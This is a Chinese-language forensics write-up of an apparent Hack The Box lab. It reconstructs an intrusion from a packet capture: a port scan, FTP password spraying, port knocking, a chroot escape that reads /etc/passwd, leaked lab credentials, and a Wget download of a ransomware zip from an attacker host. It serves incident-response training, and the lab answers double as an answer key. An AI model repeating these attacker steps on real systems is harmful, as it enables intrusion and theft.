# Knock Knock

:::info Sherlock Scenario

A critical Forela Dev server was targeted by a threat group. The Dev server was accidentally left open to the internet which it was not supposed to be. The senior dev Abdullah told the IT team that the server was fully hardened and it's still difficult to comprehend how the attack took place and how the attacker got access in the first place. Forela recently started its business expansion in Pakistan and Abdullah was the one IN charge of all infrastructure deployment and management. The Security Team need to contain and remediate the threat as soon as possible as any more damage can be devastating for the company, especially at the crucial stage of expanding in other region. Thankfully a packet capture tool was running in the subnet which was set up a few months ago. A packet capture is provided to you around the time of the incident (1-2) days margin because we don't know exactly when the attacker gained access. As our forensics analyst, you have been provided the packet capture to assess how the attacker gained access. Warning : This Sherlock will require an element of OSINT to complete fully.

一家关键的 Forela Dev 服务器受到了威胁组的攻击。Dev 服务器被意外地暴露在互联网上，而这并不是它应该存在的位置。高级开发者 Abdullah 告诉 IT 团队服务器已经完全强化，很难理解攻击是如何发生以及攻击者是如何首次获取访问权限的。Forela 最近开始在巴基斯坦进行业务扩展，而 Abdullah 正是负责所有基础架构的部署和管理。安全团队需要尽快控制和消除威胁，因为任何进一步的损害对公司都可能是毁灭性的，特别是在扩展到其他地区的关键阶段。幸运的是，几个月前在子网中设置了一个数据包捕获工具。提供给您的数据包捕获文件大致是在事件发生时（提供了 1-2 天的时间余地），因为我们不确定攻击者确切获取访问权限的时间。作为我们的取证分析师，您已被提供数据包捕获文件，以评估攻击者是如何获取访问权限的。警告：此次调查需要一定的开源情报搜集才能完全完成。

:::

## 题目数据

:::note

由于附件过大，故在此不提供下载链接

:::

## 数据预处理

由于流量包较大，所以我们先对流量包的数据进行初步提取和研判

通过 文件 -> 导出对象 功能，我们可以先对流量中传输过的文件进行初步分析，在 `FTP` 协议中找到以下文件

|    主机名    |  文件名  |
| :----------: | :------: |
| 172.31.39.46 | .backup  |
| 172.31.39.46 | fetch.sh |

然后查看文件内容

```shell title="fetch.sh"
#!/bin/bash

# Define variables
DB_HOST="3.13.65.234"
DB_PORT="3306"
DB_USER="tony.shephard"
DB_PASSWORD="GameOfthronesRocks7865!"
DB_NAME="Internal_Tasks"
QUERY="SELECT * FROM Tasks;"

# Execute query and store result in a variable
RESULT=$(mysql -h $DB_HOST -P $DB_PORT -u $DB_USER -p$DB_PASSWORD $DB_NAME -e "$QUERY")

# Print the result
echo "$RESULT"
```

```plaintext title=".backup"
[options]
    UseSyslog

[FTP-INTERNAL]
    sequence    = 29999,50234,45087
    seq_timeout = 5
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 24456 -j ACCEPT
    tcpflags    = syn


# Creds for the other backup server abdullah.yasin:XhlhGame_90HJLDASxfd&hoooad
```

通过上面得到的信息，可以初步判断数据库主机的 ip 地址是 `3.13.65.234`，并且请求的主机为 `3.109.209.43`，这个请求的主机可以确定为攻击者的 ip 地址

## Task 1

> 攻击者在枚举阶段发现了哪些端口是开放的？

根据 tcp 协议所规定的端口相应的策略，可以通过检查 `SYN` 和 `ACK` 的响应值，来判断端口是否开放

对应的筛选器表达式为

```plaintext
tcp.flags.syn==1 and tcp.flags.ack==1
```

![wireshark](img/image_20240112-121222.png)

但是发现数据量过大，于是可以检查上面发现的数据库主机的 ip

对应的筛选器表达式为

```plaintext
tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==3.109.209.43
```

同时由于后期进行了其他会话，所以在 wireshark 中确认一下端口扫描发生的大致时间点，然后做进一步细分

```plaintext
tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==3.109.209.43 && frame.number<=207500
```

由于存在大量重复数据，所以直接使用 tshark + sort + uniq + sed 进行处理

```shell
$tshark -r Capture.pcap -T fields -Y "tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==3.109.209.43 && frame.number<=207500" -e tcp.srcport | sort -n | uniq | sed ':a;N;$!ba;s/\n/,/g'
21,22,3306,6379,8086
```

```plaintext title="Answer"
21,22,3306,6379,8086
```

## Task 2

> 攻击者开始对服务器进行攻击的世界协调时间是多少？

根据上文的问题，将目标聚集在 `3.13.65.234` 这台服务器上，使用

`ip.addr==3.109.209.43`

进行筛选，第一条记录经过确认，就是攻击者开始扫描端口的记录，此记录的时间就是攻击者开始攻击的时间

```plaintext title="Answer"
21/03/2023 10:42:23
```

## Task 3

> 攻击者用于获取初始访问权限的 MITRE 技术 ID 是什么？

由于原始数据包大小较大，所以使用以下筛选器进行导出特定分组数据，保存为 `1.pcap`

```plaintext
ip.addr==3.109.209.43 && ip.addr==172.31.39.46
```

通过分析单独导出分组后的数据，可以发现前面部分的流量，都是攻击者在执行全端口扫描，所以通过定位相关包，可以进一步将端口扫描部分的数据进行剔除

```plaintext
frame.number > 131092
```

使用筛选器，导出特定分组为 `2.pcap`

通过对导出的 `2.pcap` 其中的流量进一步做分析，可以发现攻击者后续发起了大量的 ftp 登陆尝试，针对每个用户都在尝试固定的一份密码字典，可以判断为密码喷洒攻击

```plaintext title="Answer"
T1110.003
```

## Task 4

> 用于获取初始立足点的有效凭据集是什么？

使用以下筛选器进行筛选

往后面翻即可得到

```plaintext title="Answer"
tony.shephard:Summer2023!
```

## Task 5

> 攻击者用于初始访问的恶意 IP 地址是多少？

```plaintext title="Answer"
3.109.209.43
```

## Task 6

> 包含一些配置数据和凭据的文件名称是什么？

数据预处理阶段已经得到

```plaintext title="Answer"
.backup
```

## Task 7

> 关键服务运行在哪个端口上？

看 `.backup` 文件中的配置项，即可得到

```plaintext title="Answer"
24456
```

## Task 8

> 用于访问该关键服务的技术名称是什么？

通过对 `.backup` 这个配置文件进行分析，可以看出这个是 `knockd` 服务的配置文件

可以参考：[MITRE ATT&CK: Port knocking](https://resources.infosecinstitute.com/topics/mitre-attck/mitre-attck-port-knocking/)

```plaintext title="Answer"
Port knocking
```

## Task 9

> 需要与之交互以达到关键服务的哪些端口？

看 `.backup` 配置文件内容即可

```plaintext title="Answer"
29999,45087,50234
```

## Task 10

> 与上一个问题端口交互结束的世界协调时间是多少？

使用筛选器定位这三个端口

```plaintext
tcp.port==29999 || tcp.port==45087 || tcp.port==50234
```

定位时间最晚的那一条记录即可

```plaintext title="Answer"
21/03/2023 10:58:50
```

## Task 11

> 用于关键服务的一组有效凭据是什么？

看 `.backup` 文件中的配置项，即可得到

```plaintext title="Answer"
abdullah.yasin:XhlhGame_90HJLDASxfd&hoooad
```

## Task 12

> 攻击者何时以世界协调时间获得了对关键服务器的访问权限？

通过继续追踪流量，可以发现攻击者使用了 `Task 11` 中的凭据再次登陆了服务器

这里提交的时间，指服务器返回给攻击者 `230 Login successful.` 的时间

```plaintext title="Answer"
21/03/2023 11:00:01
```

## Task 13

> 开发者 “Abdullah” 的 AWS 账户 ID 和密码是什么？

在攻击者登录 ftp 服务之后，可以发现攻击者获取了 `.archived.sql` 这个文件，其中含有以下数据

```sql
DROP TABLE IF EXISTS `AWS_EC2_DEV`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `AWS_EC2_DEV` (
  `NAME` varchar(40) DEFAULT NULL,
  `AccountID` varchar(40) DEFAULT NULL,
  `Password` varchar(60) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `AWS_EC2_DEV`
--

LOCK TABLES `AWS_EC2_DEV` WRITE;
/*!40000 ALTER TABLE `AWS_EC2_DEV` DISABLE KEYS */;
INSERT INTO `AWS_EC2_DEV` VALUES ('Alonzo','341624703104',''),(NULL,NULL,'d;089gjbj]jhTVLXEROP.madsfg'),('Abdullah','391629733297','yiobkod0986Y[adij@IKBDS');
/*!40000 ALTER TABLE `AWS_EC2_DEV` ENABLE KEYS */;
UNLOCK TABLES;
```

```plaintext title="Answer"
391629733297:yiobkod0986Y[adij@IKBDS
```

## Task 14

> Forela 公司招聘开发人员的截止日期是什么时候？

在 ftp 传输的文件中，发现有一个 `Done.docx` 文件，提取之后可以看到这个图表

![Done.docx 图表](img/image_20240132-153228.png)

```plaintext title="Answer"
30/08/2023
```

## Task 15

> Forela 公司的 CEO 计划何时抵达巴基斯坦？

在 ftp 传输的文件中，发现有一个 `reminder.txt` 文件，提取之后可以得到

```plaintext
I am so stupid and dump, i keep forgetting about Forela CEO Happy grunwald visiting Pakistan to start the buisness operations
here.I have so many tasks to complete so there are no problems once the Forela Office opens here in Lahore. I am writing this
note and placing it on all my remote servers where i login almost daily, just so i dont make a fool of myself and get the
urgent tasks done.

He is to arrive in my city on 8 march 2023 :))

i am finally so happy that we are getting a physical office opening here.
```

```plaintext title="Answer"
08/03/2023
```

## Task 16

> 攻击者能够执行目录遍历并逃离 chroot 监狱。这导致攻击者可以像普通用户一样在文件系统中漫游。除了 root 之外，具有 `/bin/bash` 作为默认 Shell 的帐户的用户名是什么？

根据尝试，要获得以上信息，需要攻击者去访问 `/etc/passwd` 文件，在 ftp 的流量中进行检索

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
abdullah.yasin:x:1001:1001::/home/abdullah.yasin:/bin/sh
tony.shephard:x:1002:1002::/home/tony.shephard:/bin/sh
ftp:x:115:123:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
redis:x:116:124::/var/lib/redis:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:118:126::/var/spool/postfix:/usr/sbin/nologin
influxdb:x:119:65534::/var/lib/influxdb:/usr/sbin/nologin
cyberjunkie:x:1003:1003:,,,:/home/cyberjunkie:/bin/bash
```

```plaintext title="Answer"
cyberjunkie
```

## Task 17

> 导致攻击者获得对服务器的 ssh 访问权限的文件的完整路径是什么？

对攻击者与 ftp 进行交互的操作指令进行追踪整理，可以发现攻击者执行了以下指令

```plaintext
CWD ../
TYPE A
EPSV
LIST -la
CWD ../
EPSV
LIST -la
CWD opt
EPSV
LIST -la
EPSV
NLST
CWD reminders
EPSV
LIST -la
EPSV
NLST
TYPE I
SIZE .reminder
EPSV
RETR .reminder
MDTM .reminder
```

```plaintext title="Answer"
/opt/reminders/.reminder
```

## Task 18

> 攻击者用于访问服务器并获取完全访问权限的 SSH 密码是什么？

查看 ftp 流量中 `reminder` 文件中的说明信息

```plaintext
A reminder to clean up the github repo. Some sensitive data could have been leaked from there
```

使用以下关键词，在 Google 进行搜索

```plaintext
site:github.com ​​forela
```

找到这个 Github repo：[forela-finance / forela-dev](https://github.com/forela-finance/forela-dev/)

在储存库的历史提交中，找到 [commit 182da42](https://github.com/forela-finance/forela-dev/commit/182da42155d49211abc628c01afe8bda5ab8fcae) 中包含以下敏感信息

```xml
tasks:
- name: Log in to remote server via SSH
    become_user: root
    become_method: sudo
    vars:
    ssh_user: cyberjunkie
    ssh_password: YHUIhnollouhdnoamjndlyvbl398782bapd
    shell: sshpass -p {{ssh_password}} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {{ ssh_user }}@{{ inventory_hostname }} 'echo"Logged in via SSH"'
```

```plaintext title="Answer"
YHUIhnollouhdnoamjndlyvbl398782bapd
```

## Task 19

> 攻击者下载勒索软件的完整 URL 是什么？

回到原始的流量包文件中，使用以下筛选器导出特定分组，将受害主机的流量提取出来，保存为 `3.pcap`

```plaintext
ip.addr == 172.31.39.46
```

可以猜测，攻击者用来投放勒索软件的方式，是通过 http 协议进行投放，于是可以使用 tshark 直接进行提取

```shell
$tshark -r Capture.pcap -T fields -Y "ip.addr == 172.31.39.46 && http" -e http.request.full_uri | sed '/^\s*$/d' | sort | uniq
http://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_server.zip
http://169.254.169.254/latest/api/token
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-backports/InRelease
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy/InRelease
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/InRelease
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/main/binary-amd64/by-hash/SHA256/036db7ea401f6a8baabe8d664e58d453c86efd6102fe1a9aeb8b737a17aff4de,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/binary-amd64/by-hash/SHA256/d0465b04f6b1d7e17dd1af9b929d96827092178a7faba776a6e0768e60424d50,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/i18n/by-hash/SHA256/0c6ba92182b6b1f3d77d0ccdf57c9c6c33d1d8e201e008d74f708aa0da31efd4,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/cnf/by-hash/SHA256/97faf12ba5ec84e9143cc7e23395cc65b5a2364de57b42048bd3cbcd3a65ae43
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/main/binary-amd64/by-hash/SHA256/b750a69409f259978d4621fa515b5b517f9b5483053c162ff88184912b9eb2b1,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/main/cnf/by-hash/SHA256/ef49512a6bea71ac7200f86629f43d6d42ef738e120a5783b3c8f591c7eb8baa,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/binary-amd64/by-hash/SHA256/d43c8427e1b8959ca5768e4d3a98a28b7ebe7a22778a43e405cb1e6eb5f707b1,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/cnf/by-hash/SHA256/8ab3721dfba09b0638c4ae3b665beafea8aeab781a1afdc5784db8937a87e0c8
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/c/curl/curl_7.81.0-1ubuntu1.10_amd64.deb
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/c/curl/libcurl3-gnutls_7.81.0-1ubuntu1.10_amd64.deb
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/c/curl/libcurl4_7.81.0-1ubuntu1.10_amd64.deb
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/libpython3.10_3.10.6-1~22.04.2ubuntu1_amd64.deb
http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/python3.10_3.10.6-1~22.04.2ubuntu1_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/libpython3.10-stdlib_3.10.6-1~22.04.2ubuntu1_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/python3.10-minimal_3.10.6-1~22.04.2ubuntu1_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/libpython3.10-minimal_3.10.6-1~22.04.2ubuntu1_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/vim_8.2.3995-1ubuntu2.4_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/vim-tiny_8.2.3995-1ubuntu2.4_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/vim-runtime_8.2.3995-1ubuntu2.4_all.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/xxd_8.2.3995-1ubuntu2.4_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/vim-common_8.2.3995-1ubuntu2.4_all.deb
http://freedomhouse.org/
http://security.ubuntu.com/ubuntu/dists/jammy-security/InRelease
http://security.ubuntu.com/ubuntu/dists/jammy-security/main/binary-amd64/by-hash/SHA256/ec306b867cbab332da874121ce3136550a7f9a936743c1041c22f08f6e5f6eb0
http://security.ubuntu.com/ubuntu/dists/jammy-security/main/binary-amd64/by-hash/SHA256/f87dd0f78353885e2ca3a076c140b4cb8dea439c9e4697662b949af3ecdfc75e
http://security.ubuntu.com/ubuntu/dists/jammy-security/main/cnf/by-hash/SHA256/4d596208dfa7f6067d00b1f8caf4435cdde390a891c62547d339302c978a0363,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/binary-amd64/by-hash/SHA256/31c71a5183c29e5a698e323fcbb326bad708c4d8fec6f6f4b03091d52725494c,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/cnf/by-hash/SHA256/75fedcff7f323ba1fd5ba250aa66d41672201ea7eb367e9b7e1eec8e7cac9927
http://security.ubuntu.com/ubuntu/dists/jammy-security/main/i18n/by-hash/SHA256/84b120f9c8d1c1e9223cfc65ceddd5d19568c6bd8aa0d637375af27004fb896f,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/binary-amd64/by-hash/SHA256/6bdf67e1c6b56dc78ff85924da2ece8e8b2d764dae10351fedd36ae60137e587,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/i18n/by-hash/SHA256/8482930a283e7c0ecaf92fea95a917a62528ff8177a3ae35d71df0c3d486cf9d,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/cnf/by-hash/SHA256/2edba9e0d56d87e074af1b0b769b8d7ecf905ecfa9435d1e1da5c18be38da66b
```

在其中就可以看到一个可疑的压缩包文件

```plaintext title="Answer"
http://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_server.zip
```

## Task 20

> 攻击者用于下载勒索软件的工具 / 实用程序名称和版本是什么？

使用以下筛选器进行查询

```plaintext
ip.addr == 172.31.39.46 && http && ip.addr==13.233.179.35
```

查看 http 请求头的 `user-agent` 参数即可

```plaintext
GET /PKCampaign/Targets/Forela/Ransomware2_server.zip HTTP/1.1
Host: 13.233.179.35
User-Agent: Wget/1.21.2
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
```

```plaintext title="Answer"
Wget/1.21.2
```

## Task 21

> 勒索软件的名称是什么？

将传输的压缩包数据提取出来，使用 `binwalk` 进行分析，发现 `README.md` 文件

```plaintext title="Answer"
GonnaCry
```
